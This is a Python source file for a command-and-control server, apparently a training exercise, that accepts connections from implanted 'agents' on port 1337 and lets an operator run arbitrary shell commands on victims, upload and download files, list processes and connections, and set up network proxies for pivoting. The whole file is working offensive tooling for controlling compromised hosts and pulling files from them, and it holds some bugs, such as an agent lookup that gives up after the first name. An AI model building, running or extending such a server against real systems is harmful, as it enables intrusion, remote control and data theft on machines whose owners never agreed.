#!/usr/bin/env python3

import asyncio
import random
import signal
import struct
import aioconsole


class Agent:
    """Create an Agent object whenever an agent connectes to track outbound tasks and
    inbound responses. The tasks are stored in an asyncio.Queue which can be awaited
    on.  In you networking code, await on the Queue to know when new commands are added.
    responses is just a regular list because we dont need to be notified asnycronously
    when they arrive. The Queue will store tuples with (command, args), the responses
    will store tuples with (ret_code, message)
    """

    commands: asyncio.Queue[tuple[bytes, bytes]]
    queue_responses: asyncio.LifoQueue[tuple[int, bytes]]
    responses = list[tuple[int, bytes]]
    history = list
    name: str

    def __init__(self):
        self.commands = asyncio.Queue(20)
        self.queue_responses = asyncio.LifoQueue()
        self.responses = []
        self.history = []
        self.name = "agent_" + str(random.randint(100, 999))

    def __str__(self) -> str:
        return self.name

    def print_responses(self):
        print(f"{self} Responses")
        print(f"\033[1;32m{'ndx':>4}|{'size':>7}|{'ret':>4}|{'data':>5}\033[0;0m")
        for (i, (ret_code, data)) in enumerate(self.responses):
            print(f"\n\033[1;32m{i:>4}|{len(data):>7}|{ret_code:>4}|\033[0;0m", end="")
            for char in data.decode():
                print(char, end="")

    def print_responses_short(self):
        print(f"{self} Responses")
        print(f"\033[1;32m{'ndx':>4}|{'size':>7}|{'ret':>4}|{'data':>5}\033[0;0m")
        for (i, (ret_code, data)) in enumerate(self.responses):
            try:
                print(
                    f"\033[1;32m{i:>4}|{len(data):>7}|{ret_code:>4}|\033[0;0m{data.decode():<.50}"
                )
            except BlockingIOError:
                print("Output too large. Try 'export responses'.")


def get_agent_by_name(given_name: str, agents_connected: list[Agent]) -> Agent | None:
    """Search the agents_connected list for an agent with name: [name]. This can be a
    useful helper function throughout the code base.

    Args:
        name (str): The name of the agent.
        agents_connected (list[Agent]): the list that contains all the agents.

    Returns:
        Agent | None: The agent with the queried name or None if not found.
    """

    for agent in agents_connected:
        if given_name == agent.name:
            return agent
        else:
            return None


def export_response(responses, filename: str) -> None:
    """Writes the response to the local file system.  You can do as much or as little
    error checking as you wish.

    Args:
        response (bytes): They bytes of the response from the agent.
        filename (str): The local path which will be written to.
    """
    with open(filename, "w") as f:
        for item in responses:
            f.write(item)


async def parse_response(reader: asyncio.StreamReader) -> tuple[int, bytes]:
    """Converts the byte stream from the agent to something more useful programatically.
    The default agent returns responses generically as:

    struct response {
        uint32_t total_message_size;
        uint32_t ret_code;
        uint32_t msg_length;
        char message[msg_length]
    }

    What we care about is the message as bytes (dont eagarly convert to a str because
    a response may not be UTF-8), and the return code.

    Args:
        reader (asyncio.StreamReader): The asyncronous stream from which to read a
                                       single response from.

    Returns:
        tuple[int, bytes]: return a tuple with the return code and the message.
    """
    try:
        msg_size = await reader.read(4)
        ret_code = await reader.read(4)
        msg_length = await reader.read(
            4
        )  # Have to read so that remaining portion is only message
        msg = (
            struct.unpack("!i", msg_size)[0] - 12
        )  # '!' in format string specifies network byte format. 'i' specifies 32 bit integer
        # print("a" , msg)
        message = await reader.read(msg)
        # print("b" , len(message))
        unpack = struct.unpack("!i", ret_code)
        response = (unpack[0], message)
        return response
    except struct.error:
        pass


def create_command(command: bytes, args: bytes) -> bytes:
    """creates a packed stream of bytes that is ready to be sent to the agent.  Use
    this function as a utility to serialize commands.  A command needs to be sent in the
    following format

    struct response {
        uint32_t total_message_size;
        uint32_t command_length;
        char command[command_length];   //NULL TERMINATED
        uint32_t args_length;
        char args[args_length];
    }

    Args:
        command (bytes): the command to be sent
        args (bytes): arguments for the command (these can be wildly differnt, try to
                      split up the functionallity for generating these)

    Returns:
        bytes: a serialized bytestream that can be sent to the agent
    """
    command_length = len(command)
    args_length = len(args)
    message_size = 4 + 4 + command_length + 4 + args_length

    request = struct.pack(
        "!ii%dsi%ds" % (command_length, args_length),
        message_size,
        command_length,
        command,
        args_length,
        args,
    )  # Using f string format '%d' to allow for variable length buffer on strings
    # print(request)
    return request


def create_upload_arg(src: str, dst: str) -> bytes:
    """The agruments for the upload command are a bit more complicated that the other
    commands. Use this function to generate serialized arguments for the upload command.
    This function may involve reading from files, so add as much or as little error
    checking as you see fit.

    struct upload_args{
        uint32_t file_path_size;
        char file_path[file_path_size];       // NULL TERMINATED
        uint32_t contents_size;
        char contents[contents_size];
    }

    Args:
        src (str): path on the local host
        dst (str): path on the remote host

    Returns:
        bytes: serialzed args for a upload command
    """

    path_size = len(dst) + 1
    # print(path_size)
    with open(src, "rb") as f:
        file_contents = f.read()

    contents_size = len(file_contents)
    # print(contents_size)

    upload = struct.pack(
        "!i%dsi%ds" % (path_size, contents_size),
        path_size,
        dst.encode() + b"\x00",
        contents_size,
        file_contents,
    )
    # upload = struct.pack('!i', path_size)
    # value = hex(path_size)
    # print(value)
    # print(upload)

    return upload


def create_download_arg(remote_file: str) -> bytes:
    """The agruments for the upload command are a bit more complicated that the other
    commands. Use this function to generate serialized arguments for the upload command.
    This function may involve reading from files, so add as much or as little error
    checking as you see fit.

    struct upload_args{
        uint32_t file_path_size;
        char file_path[file_path_size];       // NULL TERMINATED
        uint32_t contents_size;
        char contents[contents_size];
    }
    struct download args{
        {uint32 args_length}
        {{uint32:file_path_size}{
            char[file_path_size]:file_path}}

    Args:
        remote_file (str): path to remote file
        dst (str): path on the local host

    Returns:
        bytes: serialzed args for a upload command
    """

    path_size = len(remote_file) + 1
    file_b = remote_file.encode() + b"\x00"
    download = struct.pack("!i%ds" % (path_size), path_size, file_b)

    return download


def create_proxy_arg(local_port: str, remote_host: str, remote_port: str) -> bytes:
    """The proxy args are also complicated like the upload args. Please note that the
    arguments that are passed in this function are not in the same order that they are
    sent on the wire.  You may choose to rearrange their order if you wish.

    struct proxy_args {
        uint32_t target_host_len
        char target_host[target_host_len];   //NULL TERMINATED
        uint32_t target_port_len;
        char target_port[target_port_len];
        uint16_t local_port                  // IMPORTANT: localport is a uint16_t while
    }                                        // target port is a NULL TERMINATED string


    Args:
        local_port (str): port to open on the remote host
        remote_host (str): host the proxy will forward to
        remote_port (str): port the poxy will forward to

    Returns:
        bytes: serialized args for the proxy command
    """
    target_host_len = len(remote_host) + 1
    target_port_len = len(remote_port) + 1
    proxy = struct.pack(
        "!i%dsi%dsh" % (target_host_len, target_port_len),
        target_host_len,
        remote_host.encode(),
        target_port_len,
        remote_port.encode(),
        int(local_port),
    )
    return proxy


async def manage_agent(
    agent: Agent, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
):
    """Handler for new agents after they connect.  Use this function as a 'main loop'
    for an individual connection to send and recive data.  Use the queue on the agent
    object to know when the user wants to send commands then await on the reader to get
    responses.  You can conveniently assume that one request will have one response so
    you can alternate between sending and recieving. The loop should be
    (in pseudo code):

    while connected:
        "wait for command from user"
        "send command to agent"
        "recieve response from agent"

    Args:
        agent (Agent): the agent object tied to this connection
        reader (asyncio.StreamReader): stream to get data from the agent
        writer (asyncio.StreamWriter): stream to send data to the agent
    """
    try:
        while True:
            command = await agent.commands.get()
            writer.write(command)
            # print(command)
            # agent.commands.task_done()
            response = await parse_response(reader)

            print("\nResponse from", agent.name, ": ")
            response_str = response[1].decode()
            for i in response_str:
                print(i, end="")
            agent.responses.append(response)
            await agent.queue_responses.put(response)
    except asyncio.CancelledError:
        print("\nConnection from Agent: " + agent.name + " closed")


def client_cb(agents_connected: list[Agent]):
    async def cb(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """This callback will get called each time a new TCP connection is made on the
        server.  use this to setup everything for an agent and start the manage_agent
        loop.  this callback closes over the agents connected param in the parent
        because it cant be passed directly as a param bacause it has to match the
        callback protocol. Use the agents_connected list to add newly connected agents.

        Args:
            reader (asyncio.StreamReader): stream to get data from the agent
            writer (asyncio.StreamWriter): stream to send data to the agent
        """
        new_client = Agent()

        response = await parse_response(reader)
        if b"checkin" in response[1]:
            print("\nClient Connected - " + new_client.name + "\r")
        agents_connected.append(new_client)
        # print(response)
        await manage_agent(new_client, reader, writer)

    return cb


def check_shutdown(agents_connected: list[Agent]):
    try:
        for agent in agents_connected:
            for response in agent.responses:
                if response[1] == b"shutting down\x00":
                    print(agent.name + " shutting down")
                    agents_connected.remove(agent)
            if agent.responses[-1][1].__contains__(b"slept"):
                print(agent.responses[-1][1].decode())
    except:
        pass


async def server(agents_connected: list[Agent]):
    """Start a async tcp server.  This can be as simple or complex as you would like.
    The provided code is the most basic setup, but you could make it more configureabe.
    as a streach you could add ssl here.

    Args:
        agents_connected (list[Agent]): The list containing all connected agents
    """

    server = await asyncio.start_server(client_cb(agents_connected), "0.0.0.0", 1337)
    await server.serve_forever()


def shell_help_message() -> None:
    print("\033[1;31m ACME \033[0;0m")
    print("=============================\n")
    print(
        "\033[1;31mWATCH THE CLI INDICATOR!\n\t'$' runs in context of all connected agents\n\t'agent_name $' runs in context of single agent \033[0;0m\n"
    )
    print("\033[1;32mlist agents\033[0;0m - list all connected agents")
    print(
        "\033[1;32mlist responses | lr\033[0;0m - list all received responses from agent. 'lr' will provide limited output."
    )
    print("\033[1;32muse [agent name]\033[0;0m - interact with agent")
    print("\033[1;32muse main\033[0;0m - return to '$'")
    print(
        "\033[1;32mexport responses [local file to write]\033[0;0m - take current agent responses and write to specified file"
    )
    print("\033[1;32mflush responses\033[0;0m - clear the responses list for the agent")
    print("\033[1;32mproclist\033[0;0m - list processes on target")
    print("\033[1;32mhostname\033[0;0m - get hostname of target")
    print("\033[1;32mnetstat\033[0;0m - get all open ports and connections for target")
    print(
        "\033[1;32mproxy [local_port] [remote_host] [remote_port]\033[0;0m - create a proxy process to pass network traffic from a local port to a target"
    )
    print(
        "\033[1;32mupload [local_file] [remote_file]\033[0;0m - upload file from local host to the target. Best to use absolute paths"
    )
    print(
        "\033[1;32mdownload [remote_file] [local_file]\033[0;0m - download a file from target and write to local host. Best to use absolute paths."
    )
    print("\033[1;32msleep [seconds]\033[0;0m - tell agent to sleep for specified time")
    print("\033[1;32mshutdown\033[0;0m - shutdown agent")
    print(
        "\033[1;32m[shell_command]\033[0;0m - run typical shell command on target. i.e. ls, cat, cd, etc."
    )


async def global_shell(agents_connected: list[Agent]):
    # asyncio.run_coroutine_threadsafe()
    while True:
        check_shutdown(agents_connected)
        cli_indicator = "$"
        from_user = await aioconsole.ainput(cli_indicator)
        command = from_user.split(" ", 1)
        try:
            ser_command = create_command(command[0].encode(), command[1].encode())
        except IndexError:
            ser_command = create_command(command[0].encode(), b"")

        if cli_indicator == "$":
            if "export responses" in from_user:
                responses = ""
                for agent in agents_connected:
                    responses += "\n" + agent.name + "\n====================\n"
                    for resp in agent.responses:
                        responses += str(resp)
                try:
                    export_response(responses, from_user.split()[2])
                    print(
                        "Successfully exported all agent responses to "
                        + from_user.split()[2]
                    )
                except:
                    print("Export failed")
            elif "list agents" in from_user:
                for agent in agents_connected:
                    print(agent.name)
            elif from_user == "list responses":
                for agent in agents_connected:
                    print("\n" + agent.name + "\n======================\n")
                    agent.print_responses()
            elif from_user == "lr":
                for agent in agents_connected:
                    print("\n" + agent.name + "\n======================\n")
                    agent.print_responses_short()
            elif command[0] == "use":
                agent_names = []
                for agent in agents_connected:
                    agent_names.append(agent.name)
                if command[1] in agent_names:
                    await local_shell(agents_connected, command[1])
                else:
                    print("Agent not found")
            elif command[0] == "upload":
                upload = create_upload_arg(from_user.split()[1], from_user.split()[2])
                ser_command = create_command(command[0].encode(), upload)
                for agent in agents_connected:
                    await agent.commands.put(ser_command)
                    agent.history.append(from_user)
            elif command[0] == "download":
                cmd_b = command[0].encode() + b"\x00"
                path_b = from_user.split()[1].encode() + b"\x00"
                ser_command = create_command(cmd_b, path_b)
                for agent in agents_connected:
                    await agent.commands.put(ser_command)
                    await asyncio.sleep(2)
                    try:
                        file = await agent.queue_responses.get()
                        file_name = from_user.split()[2] + "." + agent.name
                        with open(file_name, "wb") as f:
                            f.write(file[1])
                        # await agent.commands.put(ser_command)
                        print("[+] " + file_name + " created successfully")
                        agent.history.append(from_user)
                    except:
                        print("[-] Error writing file")
            elif command[0] == "proxy":
                command_split = from_user.split()
                cmd_b = command[0].encode() + b"\x00"
                proxy = create_proxy_arg(
                    command_split[1], command_split[2], command_split[3]
                )
                ser_command = create_command(cmd_b, proxy)
                for agent in agents_connected:
                    await agent.commands.put(ser_command)
                    agent.history.append(from_user)
            elif from_user == "flush responses":
                for agent in agents_connected:
                    for _ in range(agent.queue_responses.qsize()):
                        agent.queue_responses.get_nowait()
                        agent.queue_responses.task_done()
                    agent.responses.clear()
            elif from_user == "help":
                shell_help_message()
            elif from_user == "history":
                for agent in agents_connected:
                    print("History for " + agent.name)
                    print("========================")
                    num = 0
                    for item in agent.history:
                        print(str(num) + " " + item)
                        num += 1
            elif from_user == "":
                pass
            else:
                try:
                    ser_command = create_command(
                        b"invoke\x00", from_user.encode() + b"\x00"
                    )
                    print("[+] Sent " + from_user + " to all agents")
                    for agent in agents_connected:
                        await agent.commands.put(ser_command)
                        agent.history.append(from_user)
                except:
                    print("Command failed")


async def local_shell(agents_connected: list[Agent], current_agent: str):
    agent = get_agent_by_name(current_agent, agents_connected)
    print("Switching to ", current_agent)
    while True:
        check_shutdown(agents_connected)
        cli_indicator = current_agent + " $"

        for agent in agents_connected:
            if agent.name == current_agent:
                pass
                # print("Using agent: ", current_agent)

        from_user = await aioconsole.ainput(cli_indicator)
        command = from_user.split(" ", 1)
        try:
            ser_command = create_command(command[0].encode(), command[1].encode())
        except IndexError:
            ser_command = create_command(command[0].encode(), b"")

        if command[0] == "use":
            if command[1] == "main":
                return
            else:
                print("main not specified")
        elif "list agents" in from_user:
            for agent in agents_connected:
                print(agent.name)
        elif "list responses" in from_user:
            agent.print_responses()
        elif from_user == "lr":
            agent.print_responses_short()
        elif "export responses" in from_user:
            try:
                responses = ""
                for resp in agent.responses:
                    responses += str(resp)
                export_response(responses, from_user.split()[2])
                print("Successfully exported responses to " + from_user.split()[2])
            except:
                print("Export failed")
        elif command[0] == "upload":
            upload = create_upload_arg(from_user.split()[1], from_user.split()[2])
            ser_command = create_command(command[0].encode(), upload)
            await agent.commands.put(ser_command)
            agent.history.append(from_user)
        elif command[0] == "download":
            cmd_b = command[0].encode() + b"\x00"
            path_b = from_user.split()[1].encode() + b"\x00"
            ser_command = create_command(cmd_b, path_b)
            await agent.commands.put(ser_command)
            await asyncio.sleep(2)
            try:
                file = await agent.queue_responses.get()
                with open(from_user.split()[2], "wb") as f:
                    f.write(file[1])
                # await agent.commands.put(ser_command)
                print("[+] File downloaded successfully")
                agent.history.append(from_user)
            except:
                print("[-] Error writing file")
        elif command[0] == "proxy":
            command_split = from_user.split()
            cmd_b = command[0].encode() + b"\x00"
            proxy = create_proxy_arg(
                command_split[1], command_split[2], command_split[3]
            )
            ser_command = create_command(cmd_b, proxy)
            await agent.commands.put(ser_command)
            agent.history.append(from_user)
        elif from_user == "flush responses":
            for _ in range(agent.queue_responses.qsize()):
                agent.queue_responses.get_nowait()
                agent.queue_responses.task_done()
            agent.responses.clear()
        elif from_user == "help":
            shell_help_message()
        elif from_user == "history":
            num = 0
            for item in agent.history:
                print(str(num) + " " + item)
                num += 1
        elif from_user == "":
            pass
        else:
            ser_command = create_command(b"invoke\x00", from_user.encode() + b"\x00")
            await agent.commands.put(ser_command)
            agent.history.append(from_user)

        if len(agent.responses) != 0:
            if b"shutting down" in agent.responses[-1][1]:
                return


async def shell(agents_connected: list[Agent]):
    """Start async shell. In this function, utilize the aioconsole 3rd party library to
    asyncronously wait for input (you may decide to implement this another way without
    aioconsole). this will allow us to wait for user input without blocking the rest of
    the program, including the tcp server code.  This function can be implemented with
    the following pseudo code:

    while True:
        "wait for input"
        "parse the input"
        if "input is command"
            "put command in the right agents queue" (invoke, hostname, shutdown, etc.)
        else
            "perform functions not related to agents" (export, list agents, etc.)


    Args:
        agents_connected (list[Agent]): The list containing all connected agents
    """

    await global_shell(agents_connected)


async def main():
    """Initializes the agents list and starts the server and shell coroutine"""

    agents_connected: list[Agent] = []
    await asyncio.gather(shell(agents_connected), server(agents_connected))


def sigint_handle(_signum, _frame):
    """Exit the program if the user presses Ctrl+C"""

    print("\nClosing...")
    exit(0)


if __name__ == "__main__":
    """Register signal handler and start main with default event loop"""

    signal.signal(signal.SIGINT, sigint_handle)
    asyncio.run(main())
